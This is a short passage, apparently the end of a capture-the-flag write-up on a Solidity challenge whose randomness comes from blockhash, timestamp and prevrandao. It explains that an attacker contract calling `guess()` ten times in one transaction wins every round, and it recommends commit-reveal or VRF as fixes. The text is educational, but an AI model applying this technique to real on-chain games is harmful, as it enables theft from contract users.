- Secure on-chain randomness requires **commit-reveal mechanisms**, **Chainlink VRF**, or off-chain cryptographic proofs. If using block hashes, enforce a multi-block commit-and-resolve separation ($k \ge 2$).
- For solvers: An N-streak requirement executed in a single transaction reduces to a single calculation looped N times.

---

**Summary:** The `random()` function is deterministic because it relies on `blockhash(n-1) || timestamp || prevrandao`, which are invariant throughout a transaction. An attacker contract calling `guess()` 10 times in a single transaction reliably wins 10/10 rounds and registers as the winner.
